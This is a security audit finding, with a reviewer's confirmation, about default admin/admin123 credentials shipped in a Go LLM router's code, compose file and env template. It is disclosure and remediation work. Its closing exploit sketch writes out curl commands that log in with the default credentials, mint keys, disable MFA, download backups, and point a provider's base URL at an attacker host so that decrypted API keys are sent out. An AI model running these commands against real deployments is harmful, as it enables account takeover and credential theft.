finding.title: World-known default admin credentials admin/admin123 baked into every first-boot path (code, docker-compose, .env.template) with no forced change on first login
finding.evidence: main.go:170-173 — `pass := cfg.AdminPassword` / `if pass == "" {` / `pass = "admin123" // 仅在未设置环境变量时默认，首次启动后必须修改` / `log.Println("[bootstrap] WARNING: using default admin password 'admin123'. Set ADMIN_PASSWORD to change.")`. Reinforced by docker-compose.yml:18 `- ADMIN_PASSWORD=${ADMIN_PASSWORD:-admin123}` and the tracked template .env.template:28 `ADMIN_PASSWORD=admin123`. issueLogin (auth.go:133) only nudges MFA binding (`needBind := sec.MFAEnabled && sec.MFARequiredAll && !u.MFAEnabled`) — no must-change-password flag exists anywhere.
finding.impact: Distinct from the already-disclosed JWT_SECRET/MASTER_KEY warn-only pair: grants direct unauthenticated -> full admin (all provider keys re-enterable/exportable via testProvider, all gateway keys creatable) on any deployment following the documented `cp .env.template .env` + `docker compose up` path without editing line 28. The single login endpoint (routes.go:42 `api.POST("/auth/login", s.login)`) on a routable interface is trivially owned by scripted credential stuffing of values printed in the project's own template.
finding.mitigations_checked: Login applies bcrypt + 5-fail/15-min lockout (auth.go:76, 113-122), so online guessing of a *changed* password is throttled; bootstrap only runs when admin_users is empty (main.go:166-168). None of these help against the known default itself.
finding.recommendation: Remove the literal from .env.template and docker-compose (use `${ADMIN_PASSWORD:?set admin password}` like the redis service already does at docker-compose.yml:37); on bootstrap-without-env generate a random one-time printed password and/or a must_change_password flag enforced in middleware until changePassword runs.

reason:
VERDICT: confirmed as filed; severity high upheld; no line correction (the reported anchor main.go:172 is the exact `pass = "admin123"` literal). I read backend/cmd/server/main.go (216 lines), backend/internal/admin/auth.go (282 lines), backend/internal/admin/routes.go (196 lines), backend/internal/admin/middleware.go (33 lines), backend/internal/config/config.go (76 lines), backend/internal/settings/settings.go (158 lines), backend/internal/admin/providers.go (378 lines), backend/internal/admin/apikeys.go, backend/internal/runtime/bundle.go (180 lines) and docker-compose.yml (38 lines) end-to-end, and re-ran the finding's greps myself.

1) CITATION AUDIT — every quoted line is verbatim at the cited number. main.go:170 `	pass := cfg.AdminPassword`; 171 `	if pass == "" {`; 172 `		pass = "admin123" // 仅在未设置环境变量时默认，首次启动后必须修改`; 173 `		log.Println("[bootstrap] WARNING: using default admin password 'admin123'. Set ADMIN_PASSWORD to change.")`. docker-compose.yml:18 `      - ADMIN_PASSWORD=${ADMIN_PASSWORD:-admin123}`. .env.template:28 `ADMIN_PASSWORD=admin123` — uncommented, in a file whose header line 3 documents the usage as `cp .env.template .env`. auth.go:133 `	needBind := sec.MFAEnabled && sec.MFARequiredAll && !u.MFAEnabled`. routes.go:42 `	api.POST("/auth/login", s.login)`. auth.go:76 bcrypt compare; auth.go:113-122 `if u.FailedLogins >= 5 { loc := time.Now().Add(15 * time.Minute) ... }`; main.go:166-168 `gdb.Model(&model.AdminUser{}).Count(&count)` / `if count > 0 {` / `return`. Nothing drifted.

2) THE LOAD-BEARING NEGATIVE CLAIM IS TRUE. My own whole-repo grep for `must_?change|MustChange|force_change|need_change|password_set|first_?login|initial_?password` returns exactly ONE hit and it is the auditor's own recommendation text in docs/security/raw/audit-secrets.json — zero hits in backend/ and frontend/. model.AdminUser (model.go:13-26) has no such column (ID, Username, PasswordHash, MFASecret, MFAEnabled, MFABoundAt, RecoveryCodesJSON, FailedLogins, LockedUntil, LastLoginAt, CreatedAt, UpdatedAt). issueLogin (auth.go:124-139) does auth.Issue (:125) -> last_login_at (:131) -> recordOp (:132) -> needBind (:133) -> s.ok with the token (:134-138): there is no branch that withholds or scopes the token. The only rotation path, PUT /auth/password (routes.go:45 -> auth.go:157-184), requires the OLD password (:176) and updates only `password_hash` (:181) — i.e. the system cannot tell a rotated admin from one still using the published default at login time (auth.go never compares the presented password to any known-weak value). Frontend has no compensating gate either: Login.tsx:46 acts on `need_bind_mfa` only (client-side redirect), and `admin123` appears in frontend/src only in i18n/placeholder-free code (grep of *.tsx found no default-credential handling).

3) CHAIN INTEGRITY — the attacker genuinely lacks the privilege and the input is attacker-reachable. Preconditions are all shipped defaults: config.go:66 `AdminPassword: os.Getenv("ADMIN_PASSWORD")` (deliberately no default) + config.go:65 `AdminUser: getenv("ADMIN_USER", "admin")` -> main.go:172 -> `hash, err := bcrypt.GenerateFromPassword([]byte(pass), bcrypt.DefaultCost)` (175) -> `u := model.AdminUser{Username: cfg.AdminUser, PasswordHash: string(hash)}` (179) -> `gdb.Create(&u)` (180). The listener binds every interface: main.go:126 `srv := &http.Server{Addr: fmt.Sprintf(":%d", cfg.ListenPort), Handler: engine}`, published by docker-compose.yml:10 `- "${PORT:-8080}:8080"`. routes.go:41 creates the admin group bare (`api := r.Group("/api/admin/v1")`) and :42 is the only member with no `s.AuthMiddleware()`; grep for `gin.HandlerFunc` in the admin package yields only middleware.go:14, so no other gate (IP allowlist, throttle) wraps login — the quota limiter is wired solely into the gateway (main.go:63-67, routes.go:28 `gw.Use(gws.AuthMiddleware())`). MFA cannot rescue it: settings.go:87 `return Security{MFAEnabled: true, MFARequiredAll: false, RecoveryCodeCount: 10, GraceDays: 7}` and auth.go:86 `if sec.MFAEnabled && u.MFAEnabled` require the *user row* to be bound; the bootstrap row leaves MFAEnabled at Go's zero value false (model.go:18) and there is no user-creation route (routes.go:133-135 = GET /users, POST /users/:id/unbind-mfa, POST /users/:id/unlock). So on a stock install login is single-factor AND the needBind nudge evaluates false. The 5-fail lockout (auth.go:113-122) is per-account and worthless against a credential the project publishes — as the finding itself states.

4) ONE IMPRECISION, CORRECTED, VERDICT UNAFFECTED. "all provider keys re-enterable/exportable via testProvider" overstates that endpoint: testProvider returns only `s.ok(c, gin.H{"ok": ok, "latency_ms": latency, "message": msg, "models": models})` (providers.go:218), and GET /config/export cannot leak them either because bundle.go:17/32 marshals `[]model.Provider` whose ciphertext column is `APIKeyEnc string \`gorm:"type:text" json:"-"\`` (model.go:107). The real admin-held exfil primitive is the attacker-controlled BaseURL: updateProvider copies `p.BaseURL` straight from the request (providers.go:110) and testProvider then sends the DECRYPTED upstream key to it — providers.go:163 `key, _ := s.enc.Decrypt(p.APIKeyEnc)` -> :180 `req.Header.Set("Authorization", "Bearer "+key)` (or :177 `req.Header.Set("x-api-key", key)` for anthropic). Provider key theft = PUT /providers/:id then POST /providers/:id/test. The other impact claims are exact: "all gateway keys creatable" (apikeys.go:39 `key := "sk-" + crypto.RandomHex(16)` returned once at :54), plus tenant prompt/response reads via GET /audit/calls and a whole-DB copy via GET /backups/:id/download. The consequence — unauthenticated -> full administrative control of a router that holds every upstream vendor credential and every tenant's prompts — stands.

5) REINFORCEMENTS THE ORIGINAL REPORT DID NOT STATE (they strengthen, not alter, the finding). (a) On the flagship Docker path the *only* in-code warning is unreachable: docker-compose.yml:18 injects a non-empty value, so main.go:171 `if pass == ""` is false and lines 172-173 never execute, while bcrypt("admin123") is exactly what gets stored at :175/:179. Anyone who copies .env.template verbatim hits the same silent outcome (line 28 uncommented). Yet README.md:56 ("prints the default password to the console ... Change it immediately via the web UI") and quickstart.en.md:47 ("startup logs print a WARNING") promise an alert that provably does not fire there. warnInsecureDefaults (main.go:187-194) evaluates only `cfg.JWTSecret == "change-me-jwt-secret"` and `cfg.MasterKey == "llm-router-guard-master-key"` — the admin credential is never assessed at boot, and never at login. (b) Duplication check against the brief: the pre-agreed architecture facts cover JWT_SECRET/MASTER_KEY only; ADMIN_PASSWORD is not in that list, and this item is handled *worse* than the two disclosed ones — theirs warn in the Go-default path, this one's warning is suppressible by a file shipped in the repo. It is therefore a NEW consequence, not a re-report. (c) Cosmetic: the recommendation's exemplar `docker-compose.yml:37` (`"${REDIS_PASSWORD:?set-redis-password}"`) sits inside the commented-out redis block (lines 34-38 all begin with `#`), so it is a syntax precedent in the project, not a live control.

6) DOCUMENTATION-ONLY MITIGATIONS I weighed and rejected as sufficient: .env.template:27 (`不设置则默认 admin123 并打印告警；首启后请立即在 Web 界面修改`), quickstart.en.md:51 ("Change the password (do it right after login)") and :83 (`cp .env.template .env # edit JWT_SECRET / MASTER_KEY / ADMIN_PASSWORD`). These instruct the operator to change it; they do not make the published value invalid, do not run on the no-.env `docker compose up` path, and are not enforced anywhere in code (item 2). A one-line skip in a copy-paste quickstart is precisely the failure mode this class of finding exists for.

7) SEVERITY. Upheld at high, no downgrade. Per the rubric, critical is reserved for unauth RCE/authz-bypass/data-exfil; this is default-credential ACCOUNT TAKEOVER whose reachability depends on the operator leaving a shipped default in place (one env var, plus bcrypt at rest, plus a real warning on the non-compose path, plus a working rotation endpoint) — so it is not an unconditional authz bypass and I will not escalate it. It is equally not medium/low hygiene: the value is printed in the repo's own template, compose, and README; the console binds 0.0.0.0:8080 by default; MFA structurally cannot help (item 3); and the payoff behind the single login is every upstream provider key, every gateway key, and every tenant prompt/response. High, confirmed.
exploit_sketch:
Path A — the documented Docker quickstart, zero attacker tooling required beyond the repo text:
1) Operator follows quickstart.en.md:83-84 `cp .env.template .env` (line 28 ships `ADMIN_PASSWORD=admin123`) or skips .env entirely, then `docker compose up -d`. bootstrapAdmin sees an empty admin_users table (main.go:166-168), uses the injected non-empty 'admin123' so the WARNING at main.go:172-173 never fires, and logs only `[bootstrap] created admin user: admin` (main.go:183). Console is live on 0.0.0.0:8080 (compose:10, main.go:126).
2) Attacker (nothing to guess — the credential is published in three places in this repo):
   TOK=$(curl -sS -X POST http://TARGET:8080/api/admin/v1/auth/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin123"}' | jq -r .data.token)
   auth.go:34 finds the row, :38 not locked, :76 bcrypt matches, :81 resets failed_logins, :86 skipped (u.MFAEnabled=false), :110 -> :125 auth.Issue -> 24h HS256 admin JWT. No MFA step, no lockout risk, no rate limiter on this route (routes.go:42).
3) Burn the privilege:
   # mint a gateway key and use the tenant pool / read every prompt+response:
   curl -sS -X POST -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"name":"ops"}' http://TARGET:8080/api/admin/v1/apikeys   # apikeys.go:39/54 returns the plaintext sk-...
   curl -sS -H "Authorization: Bearer $TOK" 'http://TARGET:8080/api/admin/v1/audit/calls'
   # steal an existing upstream provider key in plaintext (corrected exfil chain):
   curl -sS -X PUT -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"name":"openai","protocol":"openai_chat","base_url":"http://ATTACKER:9999/v1","enabled":true}' http://TARGET:8080/api/admin/v1/providers/1   # providers.go:110
   curl -sS -X POST -H "Authorization: Bearer $TOK" http://TARGET:8080/api/admin/v1/providers/1/test   # :163 decrypts, :180 sends `Authorization: Bearer <victim OpenAI key>` to ATTACKER
   # total persistence / anti-forensics:
   curl -sS -X PUT -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"mfa_enabled":false,"mfa_required_for_all":false,"recovery_code_count":10,"grace_days":0}' http://TARGET:8080/api/admin/v1/settings/security
   curl -sS -H "Authorization: Bearer $TOK" http://TARGET:8080/api/admin/v1/backups/1/download   # whole SQLite/config bundle (provider ciphertext, all settings)
Path B — internet-exposed install with .env never edited: same login, plus mass scanning is trivial because both the username (`admin`, config.go:65) and password are constants of the project, so no enumeration phase is needed at all; the 5-fail lockout never engages because the first attempt succeeds.
